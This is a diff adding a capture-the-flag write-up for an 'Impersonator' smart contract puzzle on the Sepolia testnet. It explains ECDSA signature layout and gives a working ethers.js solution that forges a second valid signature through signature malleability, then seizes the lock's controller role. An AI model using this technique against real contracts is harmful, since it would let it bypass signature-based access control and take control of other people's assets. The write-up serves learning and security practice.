@@ -638,3 +638,53 @@ await contractSigner2.StakeETH({ value: stakeWei });
 ```
 
 Instead of creating a smart contract as a staker that reverts in its `receive()` function, we use another EOA to satisfy the passing requirements of this puzzle.
+
+## Problem 32: Impersonator
+
+- creation tx: [0xfc7d3a65f61a7046fd7125f9a3a039c59d11f028715ad29667ffb1ef40386fef](https://sepolia.etherscan.io/tx/0xfc7d3a65f61a7046fd7125f9a3a039c59d11f028715ad29667ffb1ef40386fef)
+- Impersonator contract: [0x6c233ae1b9e47ea3a5b17e45ebfccf3ec6f6fb28](https://sepolia.etherscan.io/address/0x6c233ae1b9e47ea3a5b17e45ebfccf3ec6f6fb28)
+- ECLocker contract: [0x7a45d6e093fd9b65d5af2d4c205a2125c735bafc](https://sepolia.etherscan.io/address/0x7a45d6e093fd9b65d5af2d4c205a2125c735bafc)
+
+
+- the lockCounter starts from `1337`.
+
+***learning***
+
+- EOA signature is always 65 bytes!!
+  - 1st 32 bytes are `r`
+  - 2nd 32 bytes are `s`
+  - last byte is `v`, represented in **uint8**
+
+The signature is:
+
+1932CB842D3E27F54F79F7BE0289437381BA2410FDEFBAE36850BEE9C41E3B91  `r`
+78489C64A0DB16C40EF986BECCC8F069AD5041E5B992D76FE76BBA057D9ABFF2  `s`
+000000000000000000000000000000000000000000000000000000000000001B  `v`
+
+You can use another set of (v,r,s) to set the controller.
+
+**solution**
+
+```ts
+let provider = new _ethers.providers.Web3Provider(window.ethereum);
+let signer = provider.getSigner();
+
+let lockAddr = "0x7a45d6e093fd9b65d5af2d4c205a2125c735bafc"
+let lockABI = [
+  "function lockId() view returns (uint256)",
+  "function msgHash() view returns (bytes32)",
+  "function controller() view returns (address)",
+  "function usedSignatures(bytes32) view returns (bool)",
+
+  "function open(uint8, bytes32, bytes32)",
+  "function changeController(uint8, bytes32, bytes32, address)",
+]
+let lock = new _ethers.Contract(lockAddr, lockABI, signer)
+
+let vbar = 28;
+let sbar = "0x87b7639b5f24e93bf106794133370f950d5e9b00f5b5c8cbd866a487529b814f";
+let r = "0x1932CB842D3E27F54F79F7BE0289437381BA2410FDEFBAE36850BEE9C41E3B91";
+let zeroAddr = "0x0000000000000000000000000000000000000000";
+await lock.changeController(vbar, r, sbar, zeroAddr);
+
+```
